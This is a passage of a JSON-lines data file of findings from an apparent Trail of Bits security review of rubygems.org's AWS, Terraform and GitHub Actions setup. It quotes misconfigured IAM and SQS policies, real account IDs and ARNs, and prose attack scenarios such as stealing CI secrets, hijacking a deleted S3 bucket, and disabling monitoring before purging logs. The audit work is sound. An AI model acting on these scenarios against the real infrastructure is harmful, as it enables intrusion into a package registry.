"Type": "Access Controls", "Finding ID": "TOB-RGM-18", "Target": "AWS IAM roles"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-019", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 19, "page_start": 51, "title": "External GitHub CI actions are not pinned", "short_summary": null, "description_md": "#### Description\n\nThe rubygems.org GitHub Action pipeline uses a third-party kubeconform action. This action is part of the supply chain for CI/CD and can execute arbitrary code in the CI/CD pipelines. The action is pinned by version, and not by commit hash.\n\n```\n- name: kubeconform\n  uses: docker://ghcr.io/yannh/kubeconform:v0.6.3\n  with:\n    entrypoint: \"/kubeconform\"\n    args: \"-strict -summary -output json --kubernetes-version ${{\nmatrix.kubernetes_version }} config/deploy/${{ matrix.environment }}.rendered.yaml\"\n```\n\n*Figure 19.1: The action pinned by version ([rubygems.org/.github/workflows/lint.yml#67–71](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/.github/workflows/lint.yml#L67-L71))*\n\nMoreover, no third-party actions in rubygems-terraform configuration are pinned by hash, although all of these actions are trusted.\n", "full_markdown": "# 19. External GitHub CI actions are not pinned\n\n| Severity: Low                                                                      | Diffi culty: High      |\n|---------------------------------------------------------------------------------------|------------------------------|\n| Type: Patching                                                                     | Finding ID: TOB-RGM-19 |\n| Target: rubygems.org lint.yml and rubygems-terraform GitHub Actions |                              |\n\n#### Description\n\nThe rubygems.org GitHub Action pipeline uses a third-party kubeconform action. This action is part of the supply chain for CI/CD and can execute arbitrary code in the CI/CD pipelines. The action is pinned by version, and not by commit hash.\n\n```\n- name: kubeconform\n  uses: docker://ghcr.io/yannh/kubeconform:v0.6.3\n  with:\n    entrypoint: \"/kubeconform\"\n    args: \"-strict -summary -output json --kubernetes-version ${{\nmatrix.kubernetes_version }} config/deploy/${{ matrix.environment }}.rendered.yaml\"\n```\n\n*Figure 19.1: The action pinned by version ([rubygems.org/.github/workflows/lint.yml#67–71](https://github.com/rubygems/rubygems.org/blob/21895a522076d15a3cb8d072229e2cfdbdb873e8/.github/workflows/lint.yml#L67-L71))*\n\nMoreover, no third-party actions in rubygems-terraform configuration are pinned by hash, although all of these actions are trusted.\n\n#### Exploit Scenario\n\nAn attacker uses social engineering to take over a private GitHub account with write permissions for one of the untrusted GitHub actions. For example, a user uses an already-leaked password and is convinced to send a 2FA code to the attacker. The attacker updates the GitHub action to include code to exfiltrate all secrets in CI/CD pipelines that use the action.\n\n#### Recommendations\n\nShort term, pin all external and [third-party](https://docs.github.com/en/actions/security-guides/security-hardening-for-github-actions#using-third-party-actions) actions to a Git commit hash. Avoid pinning to a Git tag, as these can be changed after creation. We also recommend using the [pin-github-action](https://www.npmjs.com/package/pin-github-action) or [frizbee](https://github.com/stacklok/frizbee) tool to manage pinned actions. GitHub [dependabot](https://github.com/dependabot) is capable of updating GitHub Actions that use commit hashes.\n\nLong term, audit all pinned actions or replace them with a custom implementation.\n", "severity": "Low", "difficulty": "High", "type": "Patching", "finding_id": "TOB-RGM-19", "target": {"path": "rubygems.org lint.yml and rubygems-terraform GitHub Actions", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems-terraform", "org": "rubygems", "name": "rubygems-terraform", "commit": "9c22354c60ac59de9a2cad32c3f061e196350c29", "branch": null, "relative_file": "rubygems.org lint.yml and rubygems-terraform GitHub Actions", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "High", "Type": "Patching", "Finding ID": "TOB-RGM-19", "Target": "rubygems.org lint.yml and rubygems-terraform GitHub Actions"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-020", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 20, "page_start": 52, "title": "Terraform OIDC provider has insecure configuration", "short_summary": null, "description_md": "#### Description\n\nTwo Terraform OIDC configurations are insecure: they do not validate the sub fields of authentication tokens:\n\n- [arn:aws:iam::048268392960:role/RubyAPITerraformProvisioner](https://us-east-1.console.aws.amazon.com/iam/home?region=eu-north-1#/roles/details/RubyAPITerraformProvisioner?section=trust_relationships)\n- [arn:aws:iam::048268392960:role/RubyAPITerraformCloud](https://us-east-1.console.aws.amazon.com/iam/home?region=eu-north-1#/roles/details/RubyAPITerraformCloud?section=trust_relationships)\n\n```\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"Federated\":\n\"arn:aws:iam::048268392960:oidc-provider/app.terraform.io\"\n            },\n            \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n            \"Condition\": {\n                \"StringEquals\": {\n                    \"app.terraform.io:aud\": \"aws.workload.identity\"\n                }\n            }\n        }\n    ]\n}\n```\n\n*Figure 20.1: Insecure role configuration*\n\nThe RubyAPITerraformCloud role has no permission attached, but the RubyAPITerraformProvisioner has the RubyAPITerraformCloud permission policy attached. It gives the role partial read-only access to EC2 and EKS resources, as well as the ec2:createVpc permission. More importantly, write permissions are given to EC2 and EKS resources tagged as \"rubyapi\".\n\nThe severity of this finding is low because the rubyapi project is out of this audit's scope; for that project, the severity is high.\n", "full_markdown": "# 20. Terraform OIDC provider has insecure configuration\n\n| Severity: Low               | Diffi culty: Medium    |\n|--------------------------------|------------------------------|\n| Type: Access Controls    | Finding ID: TOB-RGM-20 |\n| Target: AWS IAM roles |                              |\n\n#### Description\n\nTwo Terraform OIDC configurations are insecure: they do not validate the sub fields of authentication tokens:\n\n- [arn:aws:iam::048268392960:role/RubyAPITerraformProvisioner](https://us-east-1.console.aws.amazon.com/iam/home?region=eu-north-1#/roles/details/RubyAPITerraformProvisioner?section=trust_relationships)\n- [arn:aws:iam::048268392960:role/RubyAPITerraformCloud](https://us-east-1.console.aws.amazon.com/iam/home?region=eu-north-1#/roles/details/RubyAPITerraformCloud?section=trust_relationships)\n\n```\n{\n    \"Version\": \"2012-10-17\",\n    \"Statement\": [\n        {\n            \"Effect\": \"Allow\",\n            \"Principal\": {\n                \"Federated\":\n\"arn:aws:iam::048268392960:oidc-provider/app.terraform.io\"\n            },\n            \"Action\": \"sts:AssumeRoleWithWebIdentity\",\n            \"Condition\": {\n                \"StringEquals\": {\n                    \"app.terraform.io:aud\": \"aws.workload.identity\"\n                }\n            }\n        }\n    ]\n}\n```\n\n*Figure 20.1: Insecure role configuration*\n\nThe RubyAPITerraformCloud role has no permission attached, but the RubyAPITerraformProvisioner has the RubyAPITerraformCloud permission policy attached. It gives the role partial read-only access to EC2 and EKS resources, as well as the ec2:createVpc permission. More importantly, write permissions are given to EC2 and EKS resources tagged as \"rubyapi\".\n\nThe severity of this finding is low because the rubyapi project is out of this audit's scope; for that project, the severity is high.\n\n\n#### Exploit Scenario\n\nMallory creates a new account in HashiCorp. Due to the lack of sub claim validation, her HashiCorp account is able to configure the OIDC to assume RubyGems' RubyAPITerraformProvisioner role.\n\nMallory creates a new VPC configuration that later is incidentally attached to production EC2 instances. The new VPC enables public access to private, internal services.\n\n#### Recommendations\n\nShort term, remove the two insecure OIDC configurations.\n\nLong term, migrate all configurations to Terraform and do not manually create or update AWS resources. Doing so will enforce that all changes go through GitHub code-update workflows like peer reviews and approvals.\n\n#### References\n\n- Eduard Agavriloae, Aug 15, 2024, \"[Addressed](https://hacktodef.com/addressed-aws-defaults-risks-oidc-terraform-and-anonymous-to-administratoraccess) AWS defaults risks: OIDC, Terraform and Anonymous to [AdministratorAccess](https://hacktodef.com/addressed-aws-defaults-risks-oidc-terraform-and-anonymous-to-administratoraccess)\"\n- HashiCorp documentation, \"Dynamic [Credentials](https://developer.hashicorp.com/terraform/cloud-docs/workspaces/dynamic-provider-credentials/aws-configuration#configure-a-role-and-trust-policy) with the AWS Provider\"\n", "severity": "Low", "difficulty": "Medium", "type": "Access Controls", "finding_id": "TOB-RGM-20", "target": {"path": "AWS IAM roles", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems-terraform", "org": "rubygems", "name": "rubygems-terraform", "commit": "9c22354c60ac59de9a2cad32c3f061e196350c29", "branch": null, "relative_file": "AWS IAM roles", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "Medium", "Type": "Access Controls", "Finding ID": "TOB-RGM-20", "Target": "AWS IAM roles"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-021", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 21, "page_start": 54, "title": "RubyGems and RubyAPI projects are under a single AWS account but different Terraform configurations", "short_summary": null, "description_md": "#### Description\n\nAWS resources for the RubyGems project are managed with Terraform. Another project, rubyapi, is not managed via Terraform (or its configurations are stored in a different GitHub repository), but is deployed within the same AWS account as RubyGems. This design does not follow the principle of least privilege and creates risks of lateral movement: bugs in one project may be used to compromise the other one.\n", "full_markdown": "# 21. RubyGems and RubyAPI projects are under a single AWS account but different Terraform configurations\n\n| Severity: Medium         | Diffi culty: High      |\n|-----------------------------|------------------------------|\n| Type: Access Controls | Finding ID: TOB-RGM-21 |\n| Target: AWS account   |                              |\n\n#### Description\n\nAWS resources for the RubyGems project are managed with Terraform. Another project, rubyapi, is not managed via Terraform (or its configurations are stored in a different GitHub repository), but is deployed within the same AWS account as RubyGems. This design does not follow the principle of least privilege and creates risks of lateral movement: bugs in one project may be used to compromise the other one.\n\n#### Exploit Scenario\n\nA vulnerability in rubyapi's AWS configuration enables attackers to modify all EC2 resources. The attacker exploits this bug to make malicious changes in RubyGems' EC2 instances.\n\n#### Recommendations\n\nShort term, implement one of the following recommendations:\n\n- 1. Migrate all projects that use the single AWS account to Terraform.\n- 2. Move rubyapi (and possibly other projects) to a separate AWS account.\n\nThe decision of which solution to choose depends mostly on business context like the structure of the Ruby Central team. However, we recommend the second option, as it provides stronger isolation and will help prevent not only attacks but also configuration issues.\n\nIf the second option is chosen, then disable unused AWS Regions after projects are separated. Unused but enabled regions may be used by attackers for stealth. Resources assigned to regions can be found with, for example, AWS Tag [Editor.](https://us-east-1.console.aws.amazon.com/resource-groups/tag-editor/find-resources)\n\nLong term, list and review all Ruby Central projects and AWS accounts in the organization, and ensure that every project is either centrally managed or in a separate AWS account. When creating new projects, move them to new AWS accounts from the beginning.\n", "severity": "Medium", "difficulty": "High", "type": "Access Controls", "finding_id": "TOB-RGM-21", "target": {"path": "AWS account", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems-terraform", "org": "rubygems", "name": "rubygems-terraform", "commit": "9c22354c60ac59de9a2cad32c3f061e196350c29", "branch": null, "relative_file": "AWS account", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": "High", "Type": "Access Controls", "Finding ID": "TOB-RGM-21", "Target": "AWS account"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-022", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 22, "page_start": 55, "title": "SQS policy has S3-based policy without account", "short_summary": null, "description_md": "#### Description\n\nThe fastly\\_logs\\_production (and staging) SQS allows the rubygems-fastly-downloads-production S3 bucket to send messages to the SQS. The bucket is not limited by the aws:sourceAccount condition. If the bucket is removed and claimed by an attacker in any AWS account, the attacker will be able to send messages to the queue.\n\n```\n{\n  \"Version\": \"2008-10-17\",\n  \"Id\": \"policy-allow-from-s3\",\n  \"Statement\": [\n    {\n      \"Sid\": \"sid-allow-from-S3\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"*\"\n      },\n      \"Action\": \"SQS:SendMessage\",\n      \"Resource\": \"${sqs_arn}\",\n      \"Condition\": {\n        \"ArnLike\": {\n          \"aws:SourceArn\": \"${bucket_arn}\"\n        }\n      }\n    }\n  ]\n}\n```\n\n*Figure 22.1: SQS configuration, aws:SourceArn condition does not contain AWS account ([rubygems-terraform/modules/rubygems-org-app/policies/fastly\\\\_logs\\\\_sqs\\\\_pol](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/modules/rubygems-org-app/policies/fastly_logs_sqs_policy.tpl) [icy.tpl#1–21](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/modules/rubygems-org-app/policies/fastly_logs_sqs_policy.tpl))*\n\nPlease note that Fastly is permanently vulnerable to similar attacks, since this service does not validate the account of an S3 owner before reading data or writing logs. That is, if a S3 bucket is removed by Ruby Central and claimed by an attacker while the Fastly configuration remains unchanged, then the attacker could control data exposed on Ruby\n\n\nCentral HTTP domains. We are not aware of any mitigations that could be configured in Fastly.\n", "full_markdown": "# 22. SQS policy has S3-based policy without account\n\n| Severity: Low                | Diffi culty: High      |\n|---------------------------------|------------------------------|\n| Type: Access Controls     | Finding ID: TOB-RGM-22 |\n| Target: AWS SQS policy |                              |\n\n#### Description\n\nThe fastly\\_logs\\_production (and staging) SQS allows the rubygems-fastly-downloads-production S3 bucket to send messages to the SQS. The bucket is not limited by the aws:sourceAccount condition. If the bucket is removed and claimed by an attacker in any AWS account, the attacker will be able to send messages to the queue.\n\n```\n{\n  \"Version\": \"2008-10-17\",\n  \"Id\": \"policy-allow-from-s3\",\n  \"Statement\": [\n    {\n      \"Sid\": \"sid-allow-from-S3\",\n      \"Effect\": \"Allow\",\n      \"Principal\": {\n        \"AWS\": \"*\"\n      },\n      \"Action\": \"SQS:SendMessage\",\n      \"Resource\": \"${sqs_arn}\",\n      \"Condition\": {\n        \"ArnLike\": {\n          \"aws:SourceArn\": \"${bucket_arn}\"\n        }\n      }\n    }\n  ]\n}\n```\n\n*Figure 22.1: SQS configuration, aws:SourceArn condition does not contain AWS account ([rubygems-terraform/modules/rubygems-org-app/policies/fastly\\\\_logs\\\\_sqs\\\\_pol](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/modules/rubygems-org-app/policies/fastly_logs_sqs_policy.tpl) [icy.tpl#1–21](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/modules/rubygems-org-app/policies/fastly_logs_sqs_policy.tpl))*\n\nPlease note that Fastly is permanently vulnerable to similar attacks, since this service does not validate the account of an S3 owner before reading data or writing logs. That is, if a S3 bucket is removed by Ruby Central and claimed by an attacker while the Fastly configuration remains unchanged, then the attacker could control data exposed on Ruby\n\n\nCentral HTTP domains. We are not aware of any mitigations that could be configured in Fastly.\n\n#### Exploit Scenario\n\nThe Ruby Central team changes the bucket allowed to write to SQS but forgets to create the new bucket. An attacker notices the issue and claims the bucket. The attacker can write Fastly logs.\n\n#### Recommendations\n\nShort term, add the [aws:SourceAccount](https://docs.aws.amazon.com/IAM/latest/UserGuide/reference_policies_condition-keys.html#condition-keys-sourceaccount) condition to the policy-allow-from-s3 policy. Change the Principal field of the policy to be equal to bucket\\_arn as a defense-in-depth protection.\n\nLong term, create a GitHub workflow that lists S3 buckets referenced in the Fastly configuration, and check if the owner of all the buckets is the expected AWS account (see also [TOB-RGM-29](#page-68-0)). Alternatively, reference all S3 buckets by variables and not with hard-coded names in the Fastly configuration; this change should prevent usage of buckets not managed via Terraform.\n", "severity": "Low", "difficulty": "High", "type": "Access Controls", "finding_id": "TOB-RGM-22", "target": {"path": "AWS SQS policy", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems-terraform", "org": "rubygems", "name": "rubygems-terraform", "commit": "9c22354c60ac59de9a2cad32c3f061e196350c29", "branch": null, "relative_file": "AWS SQS policy", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "High", "Type": "Access Controls", "Finding ID": "TOB-RGM-22", "Target": "AWS SQS policy"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-023", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 23, "page_start": 57, "title": "GitHub Action Terraform policy is overly broad", "short_summary": null, "description_md": "#### Description\n\nGitHub Actions for rubygems-terraform repository (master branch) are granted all permissions to all AWS resources. The permissions should not include full access to some services, including:\n\n- Logging services like VPC [Flow](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps_examples_vpc.html#example_vpc_1) Logs and [CloudWatch](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps_examples_cloudwatch.html#example_cloudwatch_1). Compromise of the repository should not enable attackers to remove all logs.\n- Monitoring and alerting services like [GuardDuty](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps_examples_guardduty.html#example_guardduty_1). Compromise of the repository should not enable attackers to prevent the Ruby Central team from detecting the incident in a timely manner.\n- Global [configurations](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps_examples_config.html#example_config_1) like AWS Config. Compromise of the repository should not enable an attacker to disable global security configurations like the MFA requirement.\n- Creation of unexpected AWS services should not be possible. If a new service is used, then permissions to it should be explicitly granted through a change to the github-actions-terraform-policy. While not a strict security boundary, this recommendation should help detect malicious code changes in the repository.\n\nMoreover, management of other projects in the account (like RubyAPI) should not be possible from the repository (see also [TOB-RGM-21\\)](#page-54-0).\n\n```\ndata \"aws_iam_policy_document\" \"github-actions-terraform-policy\" {\n statement {\n   effect = \"Allow\"\n   condition {\n     test = \"ForAnyValue:StringLike\"\n     variable = \"token.actions.githubusercontent.com:sub\"\n     values = [\"repo:rubygems/rubygems-terraform:ref:refs/heads/master\"]\n   }\n   resources = [\"*\"]\n   actions = [\"*\"]\n }\n```\n\n\n```\nstatement {\n   effect = \"Allow\"\n   resources = [\"arn:aws:secretsmanager:us-west-2:048268392960:secret:terraform/*\"]\n   actions = [\"secretsmanager:GetSecretValue\"]\n }\n}\n```\n\n*Figure 23.1: Overly broad permissions for GitHub Actions ([rubygems-terraform/iam.tf#132–148](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/iam.tf#L132-L148))*\n\nTo prevent GitHub Actions for rubygems-terraform repository from abusing IAM permissions for privilege escalation, there are two possible solutions:\n\n- Access policies [boundaries](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html): IAM resources created via Terraform would be restricted with the same allowlist/denylist used to restrict the github-actions-terraform-policy.\n- Separate repository for IAM management: if changes to IAM are expected to be less frequent and less urgent than changes to other services, then having a separate code control repository with higher AWS privileges (to manage IAM resources), but with stricter GitHub security configuration (like strict branch protection enabled), would help to mitigate the privilege escalation attacks.\n", "full_markdown": "# 23. GitHub Action Terraform policy is overly broad\n\n| Severity: Low                     | Diffi culty: High      |\n|--------------------------------------|------------------------------|\n| Type: Access Controls          | Finding ID: TOB-RGM-23 |\n| rubygems-terraform/iam.tf Target: |                              |\n\n#### Description\n\nGitHub Actions for rubygems-terraform repository (master branch) are granted all permissions to all AWS resources. The permissions should not include full access to some services, including:\n\n- Logging services like VPC [Flow](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps_examples_vpc.html#example_vpc_1) Logs and [CloudWatch](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps_examples_cloudwatch.html#example_cloudwatch_1). Compromise of the repository should not enable attackers to remove all logs.\n- Monitoring and alerting services like [GuardDuty](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps_examples_guardduty.html#example_guardduty_1). Compromise of the repository should not enable attackers to prevent the Ruby Central team from detecting the incident in a timely manner.\n- Global [configurations](https://docs.aws.amazon.com/organizations/latest/userguide/orgs_manage_policies_scps_examples_config.html#example_config_1) like AWS Config. Compromise of the repository should not enable an attacker to disable global security configurations like the MFA requirement.\n- Creation of unexpected AWS services should not be possible. If a new service is used, then permissions to it should be explicitly granted through a change to the github-actions-terraform-policy. While not a strict security boundary, this recommendation should help detect malicious code changes in the repository.\n\nMoreover, management of other projects in the account (like RubyAPI) should not be possible from the repository (see also [TOB-RGM-21\\)](#page-54-0).\n\n```\ndata \"aws_iam_policy_document\" \"github-actions-terraform-policy\" {\n statement {\n   effect = \"Allow\"\n   condition {\n     test = \"ForAnyValue:StringLike\"\n     variable = \"token.actions.githubusercontent.com:sub\"\n     values = [\"repo:rubygems/rubygems-terraform:ref:refs/heads/master\"]\n   }\n   resources = [\"*\"]\n   actions = [\"*\"]\n }\n```\n\n\n```\nstatement {\n   effect = \"Allow\"\n   resources = [\"arn:aws:secretsmanager:us-west-2:048268392960:secret:terraform/*\"]\n   actions = [\"secretsmanager:GetSecretValue\"]\n }\n}\n```\n\n*Figure 23.1: Overly broad permissions for GitHub Actions ([rubygems-terraform/iam.tf#132–148](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/iam.tf#L132-L148))*\n\nTo prevent GitHub Actions for rubygems-terraform repository from abusing IAM permissions for privilege escalation, there are two possible solutions:\n\n- Access policies [boundaries](https://docs.aws.amazon.com/IAM/latest/UserGuide/access_policies_boundaries.html): IAM resources created via Terraform would be restricted with the same allowlist/denylist used to restrict the github-actions-terraform-policy.\n- Separate repository for IAM management: if changes to IAM are expected to be less frequent and less urgent than changes to other services, then having a separate code control repository with higher AWS privileges (to manage IAM resources), but with stricter GitHub security configuration (like strict branch protection enabled), would help to mitigate the privilege escalation attacks.\n\n#### Exploit Scenario\n\nMallory compromises the rubygems-terraform repository. She turns off monitoring and alerting AWS services, and then installs backdoors in a few gems. Later, when the attack is detected, she uses the repository to purge all AWS data, including all logs. It is much harder to perform incident response and investigate the attack.\n\n#### Recommendations\n\nShort term, limit permissions in the github-actions-terraform-policy policy:\n\n- Only allow access to services that are actually managed via Terraform.\n- Deny destructive access to logging, monitoring, alerting, and configuration services. These services generally should be set up once and not disabled or modified afterwards. For examples of access denylists, see the links in the Description section above.\n\nAdditionally, restrict resources created/managed via Terraform with the same restrictions as stated above. To do this, either use access policy boundaries or remove IAM permissions from the policy and create a separate, more hardened GitHub Terraform repository and role for only IAM management.\n\nLong term, periodically review existing policies and roles and minimize privileges to the necessary ones. Trim other full-access policies according to the recommendations above.\n", "severity": "Low", "difficulty": "High", "type": "Access Controls", "finding_id": "TOB-RGM-23", "target": {"path": "rubygems-terraform/iam.tf", "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/rubygems/rubygems-terraform", "org": "rubygems", "name": "rubygems-terraform", "commit": "9c22354c60ac59de9a2cad32c3f061e196350c29", "branch": null, "relative_file": "rubygems-terraform/iam.tf", "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-12-rubycentral-rubygemsorg-securityreview.pdf", "source_mtime": "2025-11-01T12:04:44+00:00", "report_extracted_at": "2025-11-12T02:19:22.142371+00:00", "report_extractor_version": "poc-0.4", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:19:22.148287+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": "High", "Type": "Access Controls", "Finding ID": "TOB-RGM-23", "Target": "rubygems-terraform/iam.tf"}}
{"schema_version": "0.1", "scvd_id": "SCVD-trailofbits_2024-12-rubycentral-rubygemsorg-securityreview-024", "doc_id": "trailofbits_2024-12-rubycentral-rubygemsorg-securityreview", "finding_index": 24, "page_start": 59, "title": "Networking security concerns", "short_summary": null, "description_md": "#### Description\n\nThere are a few insecure configurations related to networking. While none are currently exploitable, they may result in severe vulnerabilities in the future.\n\nIngress SSH access on port 22 is enabled for CIDR blocks 0.0.0.0/0 in the following security groups:\n\n- [rubygems-common-all](https://us-west-2.console.aws.amazon.com/vpcconsole/home?region=us-west-2#SecurityGroup:groupId=sg-9a6ddaff)\n  - This group is used by the arn:aws:elasticache:us-west-2:048268392960:cluster:shipit2 cluster. The cluster is not exposed outside of VPC, but opening port 22 is redundant, or at least the CIDR block is too open.\n- [rubygems-common-chef](https://us-west-2.console.aws.amazon.com/vpcconsole/home?region=us-west-2#SecurityGroup:groupId=sg-dec74dbb)\n  - This group is not used and appears to be a leftover.\n\nThe Amazon EKS (K8s) API endpoint is reachable through the public internet. The endpoint\\_public\\_access should be set to false to limit access to K8s admin endpoint.\n\n```\nvpc_config {\n security_group_ids = [aws_security_group.eks-cluster.id]\n endpoint_private_access = true\n endpoint_public_access = true\n```\n\n*Figure 24.1: Configuration enabling public K8s endpoint ([rubygems-terraform/eks.tf#57–60](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/eks.tf#L57-L60C5))*\n\nEKS-managed nodes have the associate\\_public\\_ip\\_address flag set to true. This results in public IPs being assigned to the nodes. The issue is not exploitable, as the external access is blocked by security groups; however, public IPs increase the chance of exploitable misconfigurations.\n\n```\nresource \"aws_launch_template\" \"eks-managed-nodes\" {\n  name = \"eks-managed-nodes\"\n```\n\n\n```\nnetwork_interfaces {\n  associate_public_ip_address = true\n  security_groups = [\n    aws_security_group.eks-node.id\n  ]\n}\n```\n\n*Figure 24.2: Configuration enabling automatic association of public IP addresses ([rubygems-terraform/eks.tf#416–424](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/eks.tf#L416-L424))*\n\nAll three subnets configured via Terraform have the map\\_public\\_ip\\_on\\_launch flag set to true. This configuration makes the AWS assign public IP addresses to new resources, which may unintentionally expose them to the internet. Please note that this flag and the associate\\_public\\_ip\\_address flag may [overwrite each](https://github.com/hashicorp/terraform/issues/10568) other.\n\n```\nresource \"aws_subnet\" \"main-a\" {\n vpc_id = aws_vpc.rubygems.id\n cidr_block = \"172.30.0.0/24\"\n availability_zone = \"us-west-2a\"\n map_public_ip_on_launch = true\n```\n\n*Figure 24.3: Configuration enabling automatic mapping of public IP addresses ([rubygems-terraform/subnets.tf#1–5](https://github.com/rubygems/rubygems-terraform/blob/9c22354c60ac59de9a2cad32c3f061e196350c29/subnets.tf#L1-L5))*\n\nCurrently all resources with public IPs are protected by security groups and are not remotely reachable. For example, IP 52.38.177.176 (network interface eni-0bdca602657463234) has a security group that blocks any internet access.\n\nFinally, network ACLs are not used. These should be configured and should [correspond](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-best-practices.html) to [security](https://docs.aws.amazon.com/vpc/latest/userguide/vpc-security-best-practices.html) groups of the VPC as a defense-in-depth mechanism.\n", "full_markdown": "| 24. Networking security concerns |                              |\n|-------------------------------------------|------------------------------|\n| Severity: Low                          | Diffi culty: High      |\n| Type: Access Controls               | Finding ID: TOB-RGM-24 |\n| Target: AWS networking              |                              |\n\n#### Description\n\nThere are a few insecure configurations related to networking. While none are currently exploitable, they may result in severe vulnerabilities in the future.\n\nIngress SSH access on port 22 is enabled for CIDR blocks 0.0.0.0/0 in the following security groups:\n\n- 